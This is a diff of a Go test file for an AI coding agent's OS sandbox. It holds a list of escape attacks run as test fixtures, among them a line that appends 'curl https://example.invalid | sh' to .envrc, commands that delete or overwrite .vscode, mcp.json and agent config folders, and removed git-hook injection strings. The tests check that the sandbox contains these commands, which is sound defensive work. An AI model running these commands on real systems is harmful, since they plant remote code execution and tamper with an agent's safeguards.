@@ -3,6 +3,7 @@
 package shell
 
 import (
+	"context"
 	"crypto/sha256"
 	"fmt"
 	"io/fs"
@@ -20,6 +21,7 @@ import (
 	"time"
 
 	"github.com/adrianliechti/wingman-agent/internal/testenv"
+	"github.com/adrianliechti/wingman-agent/pkg/harness/tool"
 )
 
 // Escape attempts against the real OS sandbox. Attack commands ignore their
@@ -373,43 +375,30 @@ func isRealDir(path string) bool {
 	return err == nil && info.Mode().Type() == os.ModeDir
 }
 
-func TestSandboxProtectsRepositoryConfiguration(t *testing.T) {
+func TestSandboxProtectsProjectConfiguration(t *testing.T) {
 	f := newEscapeFixture(t)
-	if _, err := exec.LookPath("git"); err != nil {
-		t.Skip(err)
-	}
-	git := exec.Command("sh", "-c", "git init -q && git -c user.name=fixture -c user.email=fixture@example.com -c commit.gpgsign=false commit -q --allow-empty -m init")
-	git.Dir = f.workspace
-	if output, err := git.CombinedOutput(); err != nil {
-		t.Fatalf("git fixture: %v\n%s", err, output)
-	}
 	writeFixture(t, filepath.Join(f.workspace, ".envrc"), "export SAFE=1\n")
 	writeFixture(t, filepath.Join(f.workspace, ".vscode", "settings.json"), "{}\n")
 	writeFixture(t, filepath.Join(f.workspace, "mcp.json"), "{}\n")
-	protected := []string{".git", ".envrc", ".vscode", "mcp.json"}
+	protected := []string{".envrc", ".vscode", "mcp.json"}
 	for i := range protected {
 		protected[i] = filepath.Join(f.workspace, protected[i])
 	}
 	before := treeDigest(t, protected...)
 
 	attacks := []string{
-		"git config core.hooksPath " + escapeQuote(f.outside),
-		"git config alias.st '!touch pwned'",
-		`printf '#!/bin/sh\ntouch pwned\n' > .git/hooks/pre-commit; chmod +x .git/hooks/pre-commit`,
-		"git -c user.name=x -c user.email=x@example.com commit -q --allow-empty -m injected",
-		"ln -s .git/config alias; echo '[core]' >> alias",
-		"mv .git moved-git", "rm -rf .git",
+		"ln -s .vscode/settings.json alias; echo '{}' >> alias",
 		"echo 'curl https://example.invalid | sh' >> .envrc", "rm -f .envrc", "mv .envrc moved-envrc",
 		`echo '{"tasks":[]}' > .vscode/tasks.json; echo '{}' > .vscode/settings.json; rm -rf .vscode`,
 		`echo '{"mcpServers":{}}' > mcp.json`,
 		`mv "$PWD" "$PWD-moved"`,
 	}
-	created := []string{"moved-git", "moved-envrc"}
+	created := []string{"moved-envrc"}
 	if runtime.GOOS == "darwin" {
 		// Seatbelt also covers protected names that do not exist yet and nested
-		// repositories; the Linux mount backend documents that it cannot.
-		attacks = append(attacks, "mkdir -p .claude .codex .agents; touch .claude/settings.json", "touch .mcp.json .zshrc .bashrc", "mkdir -p sub; touch sub/.envrc", "git init -q nested")
-		created = append(created, ".claude", ".codex", ".agents", ".mcp.json", ".zshrc", ".bashrc", "sub/.envrc", "nested/.git")
+		// paths; the Linux mount backend documents that it cannot.
+		attacks = append(attacks, "mkdir -p .claude .codex .agents; touch .claude/settings.json", "touch .mcp.json .zshrc .bashrc", "mkdir -p sub; touch sub/.envrc")
+		created = append(created, ".claude", ".codex", ".agents", ".mcp.json", ".zshrc", ".bashrc", "sub/.envrc")
 	}
 	for _, attack := range attacks {
 		runSandboxed(t, f.workspace, attack, nil)
@@ -418,13 +407,80 @@ func TestSandboxProtectsRepositoryConfiguration(t *testing.T) {
 	if after := treeDigest(t, protected...); after != before {
 		t.Error("sandboxed commands changed protected repository configuration")
 	}
-	for _, name := range append(created, "pwned") {
+	for _, name := range created {
 		if _, err := os.Lstat(filepath.Join(f.workspace, name)); err == nil {
 			t.Errorf("sandboxed command created %s", name)
 		}
 	}
 	if _, err := os.Stat(f.workspace + "-moved"); err == nil {
 		t.Error("sandboxed command renamed the workspace")
+	}
+}
+
+// Git metadata is writable, so committing needs no approval or re-run.
+func TestSandboxedGitCommitRunsInsideSandbox(t *testing.T) {
+	f := newEscapeFixture(t)
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip(err)
+	}
+	git := exec.Command("sh", "-c", "git init -q && git config user.name fixture && git config user.email fixture@example.com && git config commit.gpgsign false")
+	git.Dir = f.workspace
+	if output, err := git.CombinedOutput(); err != nil {
+		t.Fatalf("git fixture: %v\n%s", err, output)
+	}
+	writeFixture(t, filepath.Join(f.workspace, "a.txt"), "hello\n")
+
+	var approvals []tool.Approval
+	elicit := &tool.Elicitation{Review: func(_ context.Context, req tool.Approval) (tool.Verdict, error) {
+		approvals = append(approvals, req)
+		return tool.Verdict{Allowed: true}, nil
+	}}
+	manager := NewExecManager(nil)
+	defer manager.Close()
+	result, err := ExecTools(manager, f.workspace, elicit, nil)[0].Execute(t.Context(), map[string]any{
+		"command": "git add a.txt && git commit -q -m sandboxed && git switch -q -c feature", "wait": 30,
+	})
+	if err != nil || result.IsError || len(approvals) != 0 {
+		t.Fatalf("commit = %+v, %v; approvals %+v", result, err, approvals)
+	}
+	log := exec.Command("git", "log", "--format=%s", "feature")
+	log.Dir = f.workspace
+	if output, err := log.Output(); err != nil || strings.TrimSpace(string(output)) != "sandboxed" {
+		t.Fatalf("git log = %q, %v", output, err)
+	}
+}
+
+func TestSandboxDenialRecognisesOfflineFailures(t *testing.T) {
+	failed := exec.Command("sh", "-c", "exit 128").Run()
+	for _, tc := range []struct {
+		output  string
+		network bool
+		want    string
+	}{
+		{"fatal: Unable to create '/repo/.git/index.lock': Operation not permitted\n", false, "fatal: Unable to create '/repo/.git/index.lock': Operation not permitted"},
+		{"ssh: Could not resolve hostname github.com: -65563\nfatal: Could not read from remote repository.\n", false, "ssh: Could not resolve hostname github.com: -65563"},
+		{"fatal: unable to access 'https://github.com/o/r/': Could not resolve host: github.com\n", false, "fatal: unable to access 'https://github.com/o/r/': Could not resolve host: github.com"},
+		{"npm error getaddrinfo ENOTFOUND registry.npmjs.org\n", false, "npm error getaddrinfo ENOTFOUND registry.npmjs.org"},
+		// With IP networking granted, resolution failures are not the sandbox.
+		{"fatal: unable to access 'https://github.com/o/r/': Could not resolve host: github.com\n", true, ""},
+		{"FAIL: expected 2, got 3\n", false, ""},
+		{"--- FAIL: TestSandboxPolicy (0.01s)\n", false, ""},
+		{"bwrap: setting up uid map: Permission denied\n", false, ""},
+		{"sandbox-exec: sandbox_apply: Operation not permitted\n", false, ""},
+		{"Host key verification failed.\nfatal: Could not read from remote repository.\n", true, "Host key verification failed."},
+	} {
+		if got := sandboxDenial(tc.output, failed, tc.network); got != tc.want {
+			t.Errorf("sandboxDenial(%q, network=%t) = %q, want %q", tc.output, tc.network, got, tc.want)
+		}
+	}
+	if got := sandboxDenial("Operation not permitted\n", nil, false); got != "" {
+		t.Errorf("successful command reported as denied: %q", got)
+	}
+	// Usage errors and commands that cannot run are not sandbox denials.
+	for _, code := range []string{"2", "126", "127"} {
+		if got := sandboxDenial("grep: secret: Permission denied\n", exec.Command("sh", "-c", "exit "+code).Run(), false); got != "" {
+			t.Errorf("exit %s reported as denied: %q", code, got)
+		}
 	}
 }
 
